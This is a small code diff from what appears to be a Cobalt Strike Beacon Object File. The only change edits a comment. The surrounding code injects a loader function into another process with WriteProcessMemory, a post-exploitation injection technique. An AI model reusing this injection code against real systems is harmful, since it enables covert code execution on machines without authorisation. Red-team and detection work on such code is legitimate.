@@ -164,8 +164,8 @@ void go(char* argv, int argc) {
 		KERNEL32$CloseHandle(hProc);
 		return;
 	}
-	// Copy LibraryLoader function body — size must be a compile-time constant to avoid
-	// relying on GCC function ordering (stub - LibraryLoader can go negative).
+	// Copy LibraryLoader function body size must be a compile-time constant to avoid
+	// relying on GCC function ordering (stub LibraryLoader can go negative).
 	if (!KERNEL32$WriteProcessMemory(hProc, (PVOID)((RemoteData*)loaderMem + 1), (PVOID)LibraryLoader,
 		LOADER_CODE_SIZE, NULL)) {
 		BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory(loader) failed: %lu", KERNEL32$GetLastError());
